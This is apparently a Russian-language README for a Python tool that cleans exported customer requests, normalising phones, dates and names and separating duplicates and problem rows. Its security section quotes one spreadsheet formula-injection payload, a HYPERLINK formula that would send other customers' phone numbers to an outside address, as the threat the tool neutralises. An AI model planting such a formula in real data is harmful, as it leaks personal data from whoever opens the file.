# clean_requests — очистка «сырых» заявок

Скрипт на Python, который за один запуск приводит выгрузку заявок (сайт, Авито, звонки, формы) к единому виду: нормализует телефоны, даты и имена, убирает дубли и откладывает проблемные строки в отдельный файл с причиной.

## Было → стало

| Было | Стало |
|---|---|
| `8 (999) 000-11-22`, `+7 999 000 55 66`, `79990003344` | `+79990001122` |
| `13 мая 2026`, `13.03.2026 10:15`, `13 марта 2026 г.`, дата Excel | `2026-05-13`, `2026-03-13` |
| `иван  петров`, `ОЛЕГ`, `анна-мария` | `Иван Петров`, `Олег`, `Анна-Мария` |
| Одна и та же заявка из двух источников | Одна запись, остаётся первая |
| `хх.хх.2026`, телефон `123`, пустой телефон | В `problems_*.xlsx` с номером строки и причиной |

Пример целиком — в [examples/](examples): `requests.xlsx` на входе, `clean_requests.xlsx` и `problems_requests.xlsx` на выходе.

## Запуск

```bash
python3 -m pip install -r requirements.txt
python3 clean_requests.py examples/requests.xlsx --outdir result
```

На вход — `.xlsx` или `.csv` (UTF-8 или Windows-1251, разделитель `,` или `;`) с колонками **Имя, Телефон, Дата заявки, Источник**.

На выход:

- `clean_<файл>.xlsx` — чистые уникальные записи;
- `problems_<файл>.xlsx` — проблемные строки: номер исходной строки, причина и исходные значения.

## Правила

- **Телефон** → `+7XXXXXXXXXX`. Принимаются 10 цифр или 11, начинающиеся с 7/8; остальное — «неверный телефон».
- **Дата** → `ГГГГ-ММ-ДД`. Понимает `ДД.ММ.ГГГГ`, `ДД/ММ/ГГ`, `ГГГГ-ММ-ДД`, `13 марта 2026`, время в конце, даты Excel. Несуществующие даты (31.02) и заглушки — «битая дата».
- **Имя** → каждое слово и часть двойного имени с заглавной, лишние пробелы убраны.
- **Дубли** → по телефону среди чистых записей, остаётся первая.

## Безопасность

Данные в заявках вводят посторонние люди, а результат открывают в Excel. Поэтому:

- **Защита от формульной инъекции.** Имя вида `=HYPERLINK("https://…/?"&B3;"Подробнее")` из формы на сайте могло бы выполниться у менеджера и отправить наружу телефоны других клиентов. Скрипт сохраняет такие ячейки как текст — это покрыто тестом.
- **Безопасный разбор xlsx.** С установленным `defusedxml` openpyxl использует защищённый XML-парсер.

## Тесты

```bash
python3 -m unittest discover -s tests -v
```

Покрыты форматы телефонов, дат и имён, дедупликация, разбор причин и защита от формул.

## Стек

Python 3, pandas, openpyxl, defusedxml.
